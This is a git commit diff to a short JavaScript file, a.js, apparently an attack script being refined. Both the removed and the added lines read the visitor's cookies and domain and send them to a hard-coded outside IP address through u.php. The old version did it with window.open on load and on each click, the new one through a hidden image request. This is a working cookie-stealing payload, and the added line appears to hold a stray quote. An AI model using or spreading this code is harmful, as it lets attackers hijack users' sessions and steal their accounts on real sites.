a7eed3ff8ccef445deb06d07b9776bc18283194f
ZiYuan Han <onbpazy@163.com>
2016-07-21 09:45:17 +0800

    Update a.js

--- a.js
+++ a.js
@@ -1,6 +1,5 @@
 var c = encodeURI(document.cookie);
 var d = encodeURI(document.domain);
-window.open('//198.199.123.13/u.php?c='+c+"&d="+d);
-document.body.addEventListener('click', function() {
-            window.open('//198.199.123.13/u.php?c='+c+"&d="+d);
-        });
+var img = document.createElement("img")
+var s = '//198.199.123.13/u.php?c='+c+"&d="+d';
+img.setAttribute("src", s);
